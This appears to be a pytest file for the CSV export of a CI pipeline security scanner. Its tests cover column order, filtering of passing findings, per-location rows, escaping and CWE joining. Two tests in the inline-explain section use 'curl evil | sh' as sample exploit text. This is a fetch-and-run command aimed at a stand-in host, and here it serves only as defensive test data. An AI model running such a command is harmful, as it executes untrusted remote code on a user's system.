"""Tests for the CSV findings-export reporter."""
from __future__ import annotations

import csv
import io

from pipeline_check.core.checks.base import Finding, Location, Severity
from pipeline_check.core.csv_reporter import _COLUMNS, report_csv


def _f(check_id="GHA-001", passed=False, severity=Severity.HIGH, **kw):
    return Finding(
        check_id=check_id,
        title=kw.get("title", "Example finding"),
        severity=severity,
        resource=kw.get("resource", ".github/workflows/ci.yml"),
        description=kw.get("description", "Something is wrong."),
        recommendation=kw.get("recommendation", "Fix it."),
        passed=passed,
        cwe=kw.get("cwe", ()),
        exploit_example=kw.get("exploit_example", None),
        locations=kw.get("locations", []),
    )


def _rows(text: str) -> list[list[str]]:
    return list(csv.reader(io.StringIO(text)))


class TestShape:
    def test_header_row_is_the_stable_column_order(self):
        rows = _rows(report_csv([_f()]))
        assert rows[0] == _COLUMNS

    def test_one_data_row_per_finding(self):
        rows = _rows(report_csv([_f(check_id="A-1"), _f(check_id="A-2")]))
        assert len(rows) == 3  # header + 2
        assert [r[0] for r in rows[1:]] == ["A-1", "A-2"]

    def test_row_carries_id_severity_resource(self):
        rows = _rows(report_csv([_f(check_id="TAINT-009")]))
        row = dict(zip(_COLUMNS, rows[1], strict=True))
        assert row["check_id"] == "TAINT-009"
        assert row["severity"] == "HIGH"
        assert row["resource"] == ".github/workflows/ci.yml"


class TestFilteringPassingFindings:
    def test_passing_findings_are_skipped(self):
        rows = _rows(report_csv([
            _f(check_id="A-1", passed=True),
            _f(check_id="A-2", passed=False),
        ]))
        assert len(rows) == 2  # header + only the failing one
        assert rows[1][0] == "A-2"

    def test_no_failures_emits_header_only(self):
        rows = _rows(report_csv([_f(passed=True)]))
        assert rows == [_COLUMNS]


class TestLocations:
    def test_one_row_per_location(self):
        f = _f(locations=[
            Location(path="a.yml", start_line=3),
            Location(path="b.yml", start_line=9),
        ])
        rows = _rows(report_csv([f]))
        assert len(rows) == 3  # header + 2 locations
        files = {r[_COLUMNS.index("file")] for r in rows[1:]}
        lines = {r[_COLUMNS.index("line")] for r in rows[1:]}
        assert files == {"a.yml", "b.yml"}
        assert lines == {"3", "9"}

    def test_no_location_falls_back_to_blank_file(self):
        rows = _rows(report_csv([_f(locations=[])]))
        assert rows[1][_COLUMNS.index("file")] == ""
        assert rows[1][_COLUMNS.index("line")] == ""


class TestEscaping:
    def test_comma_quote_newline_in_description_round_trip(self):
        bad = 'has a, comma and "quotes"\nand a newline'
        rows = _rows(report_csv([_f(description=bad)]))
        # csv.reader must reconstruct the exact cell despite the embedded
        # delimiters; a naive join would have shifted the columns.
        assert rows[1][_COLUMNS.index("description")] == bad

    def test_cwe_tuple_is_semicolon_joined(self):
        rows = _rows(report_csv([_f(cwe=("CWE-79", "CWE-89"))]))
        assert rows[1][_COLUMNS.index("cwe")] == "CWE-79;CWE-89"


class TestInlineExplain:
    def test_exploit_appended_when_enabled(self):
        f = _f(exploit_example="curl evil | sh")
        rows = _rows(report_csv([f], inline_explain=True))
        desc = rows[1][_COLUMNS.index("description")]
        assert "Proof of exploit:" in desc and "curl evil | sh" in desc

    def test_exploit_omitted_by_default(self):
        f = _f(exploit_example="curl evil | sh")
        rows = _rows(report_csv([f]))
        assert "Proof of exploit:" not in rows[1][_COLUMNS.index("description")]
